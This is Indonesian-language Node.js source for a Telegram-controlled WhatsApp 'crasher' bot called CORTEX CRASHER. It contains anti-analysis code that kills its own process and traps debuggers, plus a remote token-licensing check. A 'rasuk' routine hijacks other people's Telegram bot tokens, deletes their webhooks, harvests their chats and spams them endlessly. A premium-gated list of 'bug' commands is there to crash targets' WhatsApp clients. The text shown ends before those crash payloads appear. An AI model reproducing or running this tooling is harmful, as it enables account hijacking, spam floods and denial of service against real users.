(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SCURITY CORTEX: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SCURITY CORTEX: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = "[native code]"
  const exitStr = "exit"
  const killStr = "kill"
  const httpsStr = "https"
  const httpStr = "http"
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require("child_process").execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require("module")
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require("child_process")
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require("module")
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/pausorcarowr-cloud/dbglitch/refs/heads/main/tokens.json';
const thumbnailUrl = "https://ganga--link--ghhzdp9sv8hk.code.run/i/tdt48j20";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀ ██████╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗
██╔════╝██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝
██║     ██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝
██║     ██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗
╚██████╗╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╰➤ INFORMATION:
 ▢ Developer: @Abilzyy
 ▢ Version: Auto-Update Latest
 ▢ Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
⠀⠀⠀⠀⠀ ██████╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗
██╔════╝██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝
██║     ██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝
██║     ██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗
╚██████╗╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
TOKEN TIDAK TERDAFTAR ‼️‼️
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀ ██████╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗
██╔════╝██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝
██║     ██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝
██║     ██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗
╚██████╗╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
TOKEN TIDAK TERDAFTAR ‼️‼️
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    const hashWith = alg => s => crypto.createHash(alg).update(s).digest('hex');
    const md5 = hashWith('md5');
    const sha256 = hashWith('sha256');

    let tokenData = tokenBot.split(":");
    let idBotHashes = sha256(md5(tokenData[0]));

    if (!tokens.includes(idBotHashes)) {
      console.log(chalk.bold.red(`
  Your token not registed in database!!
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.red(`
  failed connect to server!!
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});



const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀ ██████╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗
██╔════╝██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝
██║     ██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝
██║     ██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗
╚██████╗╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╰➤ INFORMATION:
 ▢ Developer: @Abilzyy
 ▢ Script: CORTEX CRASHER Crasher
 ▢ Version: Auto-Update Latest
 ▢ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>
▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀ ██████╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗
██╔════╝██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝
██║     ██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝
██║     ██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗
╚██████╗╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

╰➤ INFORMATION:
 ▢ Developer: @Abilzyy
 ▢ Script: CORTEX CRASHER Crasher
 ▢ Version: Auto-Update Latest
 ▢ Status: Bot Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

let rasukActive = false;
const RASUK_DELAY_MS = 300;

const rasukParseToken = (raw) => {
    const m = String(raw).trim().match(/^\d{6,}:[A-Za-z0-9_\-]{30,}$/);
    return m ? m[0] : null;
};

const rasukGetMe = async (token) => {
    try {
        const r = await axios.get(`https://api.telegram.org/bot${token}/getMe`, { timeout: 10000 });
        return r.data.ok ? r.data.result : null;
    } catch (e) {
        return null;
    }
};

const rasukClearWebhook = async (token) => {
    try {
        await axios.get(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=false`, { timeout: 10000 });
    } catch (e) {}
};

const rasukGetChats = async (token) => {
    try {
        const r = await axios.get(`https://api.telegram.org/bot${token}/getUpdates?limit=100&timeout=0`, { timeout: 15000 });
        if (!r.data.ok) return null;
        const set = new Set();
        for (const u of r.data.result) {
            const c = u.message?.chat?.id
                || u.edited_message?.chat?.id
                || u.channel_post?.chat?.id
                || u.my_chat_member?.chat?.id
                || u.callback_query?.message?.chat?.id;
            if (c) set.add(c);
        }
        return [...set];
    } catch (e) {
        return null;
    }
};

const rasukSend = async (token, chatId, text) => {
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: text
        }, { timeout: 10000 });
        return { ok: true };
    } catch (e) {
        const status = e.response?.status;
        const data = e.response?.data;
        if (status === 429) {
            const wait = (data?.parameters?.retry_after || 1) * 1000;
            await sleep(wait);
            return { ok: false, retry: true };
        }
        if (status === 403 || status === 400) {
            return { ok: false, dead: true, reason: data?.description || "blocked" };
        }
        return { ok: false, reason: e.message };
    }
};

const rasukLoop = async (token, botInfo, initialChats, message) => {
    const alive = new Set(initialChats);
    let sent = 0;
    let dead = 0;
    let errors = 0;

    while (rasukActive) {
        const batch = [...alive];
        for (const chatId of batch) {
            if (!rasukActive) break;
            const res = await rasukSend(token, chatId, message);
            if (res.ok) {
                sent++;
            } else if (res.dead) {
                alive.delete(chatId);
                dead++;
            } else if (res.retry) {
            } else {
                errors++;
            }
            await sleep(RASUK_DELAY_MS);
        }

        if (alive.size === 0) {
            console.log(`[rasuk] @${botInfo.username} no alive chats, stopping`);
            break;
        }
    }

    return { sent, dead, errors, alive: alive.size };
};

// ============ CLAIM PREMIUM GROUP ============
const claimGroupsPath = './database/claimGroups.json';

function loadClaimGroups() {
    try {
        if (fs.existsSync(claimGroupsPath)) {
            return JSON.parse(fs.readFileSync(claimGroupsPath, 'utf8'));
        }
    } catch (e) {}
    return [];
}

function saveClaimGroups(groups) {
    const dir = path.dirname(claimGroupsPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(claimGroupsPath, JSON.stringify(groups, null, 2));
}

// ============ MIDDLEWARE GLOBAL CEK PREMIUM ============
bot.use(async (ctx, next) => {
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const command = ctx.message?.text?.split(" ")[0] || "";

    if (userId == ownerID) return next();

    const bugCommands = ['/bangcwa', '/lockbrutal', '/xspam', '/corforce', '/corlock', '/corhard', '/corfreeze', '/onichan', '/corinvis', '/corblank', '/testfunction', '/bandgb', '/corios'];
    if (!bugCommands.some(cmd => command.startsWith(cmd))) return next();

    if (ctx.chat.type === 'private') return next();

    const isPrem = isPremiumUser(userId);

    if (!isPrem) {
        const groups = loadClaimGroups();
        const groupId = chatId.toString();

        if (groups.includes(groupId)) {
            return ctx.reply(`
<blockquote>❌ AKSES DITOLAK!
━━━━━━━━━━━━━━━━━━━━━━
Anda belum premium.

📌 CARA CLAIM PREMIUM:
Ketik /claim di group ini.

⚡ Premium gratis 30 hari!
            `, { parse_mode: 'HTML' });
        } else {
            return ctx.reply(`
❌ AKSES DITOLAK!
━━━━━━━━━━━━━━━━━━━━━━
Anda belum premium.
Hubungi owner untuk mendapatkan akses premium.</blockquote>
            `, { parse_mode: 'HTML' });
        }
    }

    next();
});

// ============ COMMAND CLAIM PREMIUM ============
bot.command("addgb", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Hanya owner!");

    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("📌 /addgb -1001234567890");

    const groupId = args[1];
    const groups = loadClaimGroups();

    if (groups.includes(groupId)) return ctx.reply("⚠️ Group sudah terdaftar!");

    groups.push(groupId);
    saveClaimGroups(groups);

    let nama = groupId;
    try { const chat = await ctx.telegram.getChat(groupId); nama = chat.title || groupId; } catch(e) {}

    ctx.reply(`✅ Group berhasil ditambahkan!\n📛 ${nama}\n🆔 ${groupId}`);
});

bot.command("delgb", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Hanya owner!");

    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("📌 /delgb -1001234567890");

    const groupId = args[1];
    let groups = loadClaimGroups();

    if (!groups.includes(groupId)) return ctx.reply("❌ Group tidak ditemukan!");

    groups = groups.filter(id => id !== groupId);
    saveClaimGroups(groups);

    ctx.reply(`✅ Group berhasil dihapus!\n🆔 ${groupId}`);
});

bot.command("listgb", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Hanya owner!");

    const groups = loadClaimGroups();

    if (groups.length === 0) return ctx.reply("📭 Belum ada group terdaftar.");

    let list = "<blockquote>📋 DAFTAR GROUP CLAIM PREMIUM\n━━━━━━━━━━━━━━━━━━━━━━\n";
    let i = 1;

    for (const g of groups) {
        let nama = g;
        try { const chat = await ctx.telegram.getChat(g); nama = chat.title || g; } catch(e) {}
        list += `${i}. ${nama}\n   ${g}\n\n`;
        i++;
    }

    list += `━━━━━━━━━━━━━━━━━━━━━━\n📊 Total: ${groups.length} group</blockquote>`;
    ctx.reply(list, { parse_mode: 'HTML' });
});

bot.command("claim", async (ctx) => {
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;
    const chatType = ctx.chat.type;

    if (chatType !== 'group' && chatType !== 'supergroup') {
        return ctx.reply("❌ Hanya di group!");
    }

    if (isPremiumUser(userId)) {
        return ctx.reply("✅ Anda sudah premium!");
    }

    const groups = loadClaimGroups();
    if (!groups.includes(chatId.toString())) {
        return ctx.reply("❌ Group tidak terdaftar mohon untuk owner script untuk gunakan command /addgb -108xxx");
    }

    const duration = 30;
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    const premiumUsers = loadPremiumUsers();
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);

    let nama = chatId;
    try { const chat = await ctx.telegram.getChat(chatId); nama = chat.title || chatId; } catch(e) {}

    ctx.reply(`
<blockquote>🎉 SELAMAT! PREMIUM BERHASIL DI-CLAIM!
━━━━━━━━━━━━━━━━━━━━━━
👤 User: ${ctx.from.first_name}
🆔 ID: ${userId}
📅 Expired: ${expiryDate}
📦 Durasi: ${duration} Hari
📛 Group: ${nama}
━━━━━━━━━━━━━━━━━━━━━━
⚡ Sekarang akses semua fitur premium!</blockquote>
    `, { parse_mode: 'HTML' });

    try {
        await ctx.telegram.sendMessage(ownerID, `🎉 CLAIM PREMIUM!\n👤 ${ctx.from.first_name}\n🆔 ${userId}\n📅 ${expiryDate}\n📛 ${nama}`);
    } catch(e) {}
});

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "ABIL1958");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
▢ Number: ${phoneNumber}
▢ Pairing Code: ${formattedCode}
▢ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
